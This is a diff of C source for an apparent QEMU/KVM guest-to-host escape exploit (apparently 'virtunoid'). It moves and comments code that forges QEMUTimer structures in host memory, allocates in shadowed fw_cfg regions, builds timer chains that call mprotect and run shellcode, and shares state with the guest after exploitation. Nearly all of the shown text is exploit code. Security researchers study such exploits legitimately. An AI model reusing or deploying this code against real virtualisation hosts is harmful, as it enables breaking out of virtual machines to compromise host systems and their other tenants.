@@ -76,6 +76,9 @@ typedef void    *gva_t;
 #define FW_CFG_E820_TABLE (FW_CFG_ARCH_LOCAL + 3)
 #define FW_CFG_HPET (FW_CFG_ARCH_LOCAL + 4)
 
+#define PORT 0xae08
+#define QEMU_GATEWAY  "10.0.2.2"
+
 /***********************************************************************/
 
 #include "virtunoid-config.h"
@@ -114,6 +117,25 @@ struct IORange {
 
 /*********************************************************************/
 
+/*
+ * These structures describe the writable fw_cfg regions in the
+ * host. We keep a shadow copy of those regions, and
+ * commit_targets()/read_targets() sync between our shadow regions and
+ * the real buffers on the host.
+ *
+ * gva_to_hva knows about these shadow regions and uses the fw_cfg
+ * addresses when possible.
+ *
+ * host_alloc implements a simple first-fit allocator into the shadow
+ * regions.
+ *
+ * snapshot_targets/rollback_targets implement a checkpoint/restore
+ * mechanism on the allocator state. This is used to first allocate a
+ * bunch of structures that will be needed for every timer chain, then
+ * take a checkpoint before executing individual timer chains, after
+ * which the state can be rolled back.
+ *
+ */
 struct target_region {
     hva_t hva;
     uint8_t *data;
@@ -248,24 +270,10 @@ hva_t gva_to_hva(gva_t addr) {
     return gpa_to_hva(gva_to_gpa(addr));
 }
 
-#define PORT 0xae08
-#define QEMU_GATEWAY  "10.0.2.2"
-
-u_short in_cksum(const u_short *addr, register int len, u_short csum);
-
-struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
-    struct QEMUTimer *timer = host_alloc(sizeof *timer);
-    memset(timer, 0, sizeof *timer);
-    timer->clock = CLOCK_HVA;
-#ifdef HAVE_TIMER_SCALE
-    timer->scale = 1;
-#endif
-    timer->cb = cb;
-    timer->opaque = opaque;
-    timer->next = next ? gva_to_hva(next) : 0;
-    return timer;
-}
-
+/*
+ * This structure is used to communicate data between the host and
+ * guest post-exploitation.
+ */
 #define page_aligned __attribute__((aligned(PAGE_SIZE)))
 
 struct shared_state {
@@ -290,6 +298,23 @@ void shellcode(struct shared_state *share) {
 }
 asm("end_shellcode:");
 extern char end_shellcode[];
+
+/*
+ * Construct and return a single fake timer, with the specified
+ * fields.
+ */
+struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
+    struct QEMUTimer *timer = host_alloc(sizeof *timer);
+    memset(timer, 0, sizeof *timer);
+    timer->clock = CLOCK_HVA;
+#ifdef HAVE_TIMER_SCALE
+    timer->scale = 1;
+#endif
+    timer->cb = cb;
+    timer->opaque = opaque;
+    timer->next = next ? gva_to_hva(next) : 0;
+    return timer;
+}
 
 /*
  * Construct a timer chain that performs an mprotect() and then calls
@@ -390,6 +415,8 @@ void wait_rtc(void) {
     outb(10,   0x70);
     outb(0xF0, 0x71);
 }
+
+u_short in_cksum(const u_short *addr, register int len, u_short csum);
 
 int main(void) {
     int fd;
